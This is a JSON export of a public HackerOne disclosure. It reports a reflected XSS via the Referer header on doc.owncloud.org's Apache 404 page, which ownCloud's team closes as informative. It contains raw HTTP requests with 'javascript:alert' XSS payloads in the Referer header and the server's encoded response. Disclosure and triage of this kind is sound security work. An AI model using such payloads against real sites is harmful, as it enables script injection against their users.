{"id":130951,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzA5NTE=","url":"https://hackerone.com/reports/130951","title":"doc.owncloud.org: XSS via Referrer","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2016-04-15T00:15:38.758Z","submitted_at":"2016-04-15T00:15:38.758Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sandh0t","url":"/sandh0t","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":3059,"url":"https://hackerone.com/owncloud","handle":"owncloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"ownCloud","twitter_handle":"ownCloud","website":"https://www.owncloud.com","about":"ownCloud GmbH is the company behind the ownCloud Project - the most downloaded open source project for data and file sync, share and view."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-04-15T09:20:08.539Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2016-04-15T08:43:33.492Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nThe Referer Header in the following request, can be used to trigger an XSS.\n\n\nGET /promote/ HTTP/1.1\nHost: doc.owncloud.org\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\nReferer: javascript:alert('XSS');\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Length: 2\n\nThe Referrer Value is reflected in the page (in the \"referring page\" link) see the PoC, however the XSS is not trigger until the victim click in the link.\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":85691,"file_name":"xss_poc_1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/085/691/27a000f07856f77509f63f0e895e21b4a3a6d981/xss_poc_1.png?response-content-disposition=attachment%3B%20filename%3D%22xss_poc_1.png%22%3B%20filename%2A%3DUTF-8%27%27xss_poc_1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ33OZT5PP%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133739Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDh91HQqgz8mt29LtWDknUFVa4Bu86qeWnq8qOBQ4%2B8YAIhAJicmQmdRKuH%2BFKshKD5HTFqxieLS9bLt%2Bm8ixoUQIW3KoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxjBiCZo4VtYu6s0mkq1wMS3NiFshNMAkLirys6UqWqG8DtyLSnjp2Jjq3FOYZ3z5QPGI3pyApw22mHN9%2FCuJJ7nvZBlTnqVZioeymrRwRkh3Ep2Grp7bfy17tsucRab4%2Fwcov%2FuB%2BH%2FlOKLA0dPOLvtzKyIZukVE4weTfh0vOmJyKq0MNT872S%2BEJQLaNHxuaApYj89CoiKQ8iIYPil%2Fer515Tq61zraK163aXC6Wy%2Bh9wZG9n9nO%2BF1HjHbOKQzNHLtEPDs0LaRFl2yyG012UrzxbWRh3SKf%2BZrF4YZHuHGoHHIILeGK7ULsTEUwPzgUchRw1iPy0mN9FOZAmWbrDJGsit0hVq3pp5X2hPUG4sFE8%2F6L9i0WnB%2B10Vp3U%2Frt684dQjLB%2BN9XMGfru4gI4tqqTswEvdVKIEl24vu1y1GF4NHtB52g2uU0a32AMPT4CyiEmO89SmREN7kkSkG506ZPZM6WpVb3X01QplYYRrO8hlLoLzsG90yPauXyc9z1g3ctobA3rwzP0%2BqnbTFOPOLdg%2Fez87Kn7dOH%2FJ5gT4VcfvDJKUt7spf4PMSNNs%2B45MGrcVDhtPaqpVkGpjTY2Qumd8jnWYmah%2BcSUkcSfYxIQ8VjPNpkeGcsLaLhPLK%2BhKhc6iXUw9vqQiwY6pAEkpudJjvKBj1n%2B2NK2uzTbiu0zjrqvjRC7B2s5rDWkChSlyjdb5Gs7Y4xGynRFg2owPJvc66mub6OLgiEzz%2BMOYFcjvSwIHpDD0Esy3kPtVCPpCMvheYuZFtLkLN%2FOortUj7F7jaVVdakEud32Wsg33glLfI0B%2F55RSf0DkRble%2FhL0EB4lzVO1F1OLS0MQQYssZKljr4UYXvI8G5j0rwW6dHIGQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=efce03032461f9be1a5362489b685ddd7887635a3759b6005e31564ccc024754","file_size":59913,"type":"image/png"},{"id":85692,"file_name":"xss_poc_2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/085/692/d0eb692a01be380ffc3a0b327b5da4fa4e3ad5a0/xss_poc_2.png?response-content-disposition=attachment%3B%20filename%3D%22xss_poc_2.png%22%3B%20filename%2A%3DUTF-8%27%27xss_poc_2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ33OZT5PP%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133739Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDh91HQqgz8mt29LtWDknUFVa4Bu86qeWnq8qOBQ4%2B8YAIhAJicmQmdRKuH%2BFKshKD5HTFqxieLS9bLt%2Bm8ixoUQIW3KoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxjBiCZo4VtYu6s0mkq1wMS3NiFshNMAkLirys6UqWqG8DtyLSnjp2Jjq3FOYZ3z5QPGI3pyApw22mHN9%2FCuJJ7nvZBlTnqVZioeymrRwRkh3Ep2Grp7bfy17tsucRab4%2Fwcov%2FuB%2BH%2FlOKLA0dPOLvtzKyIZukVE4weTfh0vOmJyKq0MNT872S%2BEJQLaNHxuaApYj89CoiKQ8iIYPil%2Fer515Tq61zraK163aXC6Wy%2Bh9wZG9n9nO%2BF1HjHbOKQzNHLtEPDs0LaRFl2yyG012UrzxbWRh3SKf%2BZrF4YZHuHGoHHIILeGK7ULsTEUwPzgUchRw1iPy0mN9FOZAmWbrDJGsit0hVq3pp5X2hPUG4sFE8%2F6L9i0WnB%2B10Vp3U%2Frt684dQjLB%2BN9XMGfru4gI4tqqTswEvdVKIEl24vu1y1GF4NHtB52g2uU0a32AMPT4CyiEmO89SmREN7kkSkG506ZPZM6WpVb3X01QplYYRrO8hlLoLzsG90yPauXyc9z1g3ctobA3rwzP0%2BqnbTFOPOLdg%2Fez87Kn7dOH%2FJ5gT4VcfvDJKUt7spf4PMSNNs%2B45MGrcVDhtPaqpVkGpjTY2Qumd8jnWYmah%2BcSUkcSfYxIQ8VjPNpkeGcsLaLhPLK%2BhKhc6iXUw9vqQiwY6pAEkpudJjvKBj1n%2B2NK2uzTbiu0zjrqvjRC7B2s5rDWkChSlyjdb5Gs7Y4xGynRFg2owPJvc66mub6OLgiEzz%2BMOYFcjvSwIHpDD0Esy3kPtVCPpCMvheYuZFtLkLN%2FOortUj7F7jaVVdakEud32Wsg33glLfI0B%2F55RSf0DkRble%2FhL0EB4lzVO1F1OLS0MQQYssZKljr4UYXvI8G5j0rwW6dHIGQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=fad9a6d20def24304cae2af9685a1ca8d6fff9494de0b79708db091cd3836e2f","file_size":69595,"type":"image/png"}],"allow_singular_disclosure_at":"2016-05-15T08:43:33.541Z","allow_singular_disclosure_after":-170657646.44691935,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","spetr0x","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":907007,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. We take security very seriously and would appreciate if you would not share any information about this bug until we have determined a potential patch.\r\n \r\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster.","automated_response":true,"created_at":"2016-04-15T00:15:38.958Z","updated_at":"2016-04-15T00:15:38.958Z","actor":{"url":"/owncloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"ownCloud"}},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":907362,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Thanks a lot for your report. We have discussed this internally and consider this acceptable behaviour due to the following facts:\n\n1. Setting the referer of a UA to something like `javascript:alert(1)` is something that cannot be done by other web pages. This also applies when the user is coming from pages like `data:text/html,\u003cscript\u003ewindow.location = \"https://doc.owncloud.org/promote\";\u003c/script\u003e`.\n2. The sent referer is properly encoding `\u003e`, `\u003c` and `\"` thus a bypass is not possible from other domains as well.\n\n```http\nGET /promote HTTP/1.1\nHost: doc.owncloud.org\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://localhost/test.html?asa=a:javascript:alert(1)\"\u003e\u003ch1\u003ea\nConnection: close\nCache-Control: max-age=0\n````\n\n```\nHTTP/1.1 404 Not Found\nDate: Fri, 15 Apr 2016 08:40:53 GMT\nServer: Apache/2.4.10 (Linux/SUSE)\nVary: accept-language,accept-charset\nStrict-Transport-Security: max-age=63072000\nX-Xss-Protection: 1; mode=block\nAccept-Ranges: bytes\nConnection: close\nContent-Type: text/html; charset=utf-8\nContent-Language: en\nContent-Length: 1223\n\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\"\n  \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"\u003e\n\u003chtml xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\" xml:lang=\"en\"\u003e\n\u003chead\u003e\n\u003ctitle\u003eObject not found!\u003c/title\u003e\n\u003clink rev=\"made\" href=\"mailto:webmaster@owncloud.org\" /\u003e\n\u003cstyle type=\"text/css\"\u003e\u003c!--/*--\u003e\u003c![CDATA[/*\u003e\u003c!--*/ \n    body { color: #000000; background-color: #FFFFFF; }\n    a:link { color: #0000CC; }\n    p, address {margin-left: 3em;}\n    span {font-size: smaller;}\n/*]]\u003e*/--\u003e\u003c/style\u003e\n\u003c/head\u003e\n\n\u003cbody\u003e\n\u003ch1\u003eObject not found!\u003c/h1\u003e\n\u003cp\u003e\n\n\n    The requested URL was not found on this server.\n\n  \n\n    The link on the\n    \u003ca href=\"http://localhost/test.html%3fasa=a:javascript:alert(1)%22%3e%3ch1%3ea\"\u003ereferring\n    page\u003c/a\u003e seems to be wrong or outdated. Please inform the author of\n    \u003ca href=\"http://localhost/test.html%3fasa=a:javascript:alert(1)%22%3e%3ch1%3ea\"\u003ethat page\u003c/a\u003e\n    about the error.\n\n  \n\n\u003c/p\u003e\n\u003cp\u003e\nIf you think this is a server error, please contact\nthe \u003ca href=\"mailto:webmaster@owncloud.org\"\u003ewebmaster\u003c/a\u003e.\n\n\u003c/p\u003e\n\n\u003ch2\u003eError 404\u003c/h2\u003e\n\u003caddress\u003e\n  \u003ca href=\"/\"\u003edoc.owncloud.org\u003c/a\u003e\u003cbr /\u003e\n  \u003cspan\u003eApache/2.4.10 (Linux/SUSE)\u003c/span\u003e\n\u003c/address\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nFurthermore even in case of a non-standard compliant browser allowing sending of this referer this would require a highly unlikely amount of user interaction. \n\nFor all of these reasons we consider this behaviour acceptable for now and will close this issue as informative. Furthermore, since these are the default Apache error pages we further encourage you to submit an issue to Apache if you believe this to be a valid hardening.","automated_response":false,"created_at":"2016-04-15T08:43:28.155Z","updated_at":"2016-04-15T08:43:28.155Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":907363,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Due to the high amount with reports related to Apache default error pages we're requesting public disclosure on that one. Thanks again for your report.","automated_response":false,"created_at":"2016-04-15T08:43:33.512Z","updated_at":"2016-04-15T08:44:26.182Z","first_to_agree":true,"actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":907411,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I was expecting you consider this behaviour acceptable, however it felt wrong not to report this issue to you, will thanks for your response, and you can disclose it publicly.","automated_response":false,"created_at":"2016-04-15T09:15:45.025Z","updated_at":"2016-04-15T09:15:45.025Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":907417,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"Thank you for the report again :)","automated_response":false,"created_at":"2016-04-15T09:20:08.498Z","updated_at":"2016-04-15T09:20:08.498Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":907467,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"you are welcome :)","automated_response":false,"created_at":"2016-04-15T09:39:34.498Z","updated_at":"2016-04-15T09:39:34.498Z","actor":{"username":"sandh0t","cleared":true,"url":"/sandh0t","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/299/944129af89e7f714b860d3bf18fdb3500424b999_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}